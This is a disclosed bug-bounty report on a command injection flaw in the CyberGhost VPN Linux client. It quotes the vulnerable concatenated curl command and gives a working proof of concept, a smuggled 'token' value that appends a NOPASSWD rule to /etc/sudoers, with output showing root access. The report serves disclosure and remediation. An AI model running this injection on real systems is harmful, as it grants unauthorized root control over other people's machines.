# Title: Linux Client Command Injection - Local Privilege Escalation

- **Platform**: Bugcrowd
- **Program**: CyberGhost VPN
- **Severity**: Critical (P1)
- **Date**: 2022-12-01
- **Researcher**: mmmdspl
- **Bounty**: N/A

## Summary
A command injection vulnerability was discovered in CyberGhost VPN's Linux client. The vulnerability allowed a user with limited sudo privileges (only `cyberghostvpn`) to escalate to root by injecting commands via user-controllable configuration values.

## Technical Details
The Linux client's WireGuard implementation constructs commands using string concatenation. The `token` and `secret` values come from a user-controllable configuration file (`device.conf`). These values are passed unsanitized to a shell command executed with root privileges. By modifying the configuration file and initiating a VPN connection, an attacker's commands are executed as root.

The vulnerable code in `wireguard.py`:
```python
command = 'curl [...] --header "' + token + '" --header "pubkey=' + publicKey + '" "https://' + hostname + ':1337/addKey"'
proc = Helpers().executeCommand(command)
```

## Steps to Reproduce
1. Ensure the user can run `cyberghostvpn` with sudo
2. Edit the configuration file to inject commands in `token` or `secret` fields
3. Connect to the VPN: `sudo cyberghostvpn --wireguard --connect --country-code CZ`
4. The injected command executes with root privileges

## Proof of Concept
```
# Modify the configuration file to inject command
# Add to device.conf:
token = "; echo 'user ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers;"

# Connect to VPN
$ sudo cyberghostvpn --wireguard --connect --country-code CZ
Prepare Wireguard connection ...
Select server ... prague-s401-i16
Connecting ...
WIREGUARD error: cannot add key!

# Verify privilege escalation
$ sudo -l
User user may run the following commands on myhost:
    (ALL) NOPASSWD: ALL
$ sudo su
# whoami
root
```

## Impact
- Local privilege escalation from limited user to full root
- Complete system compromise
- Persistence via modified system files

## Remediation
CyberGhost fixed the issue by sanitizing configuration values, using parameterized commands, and avoiding string concatenation for system commands. They also implemented proper input validation for configuration file values.

## References
- https://bugcrowd.com/disclosures/93d4a008-31dc-441c-a160-ab81d217e288/linux-client-command-injection-local-privilege-escalation
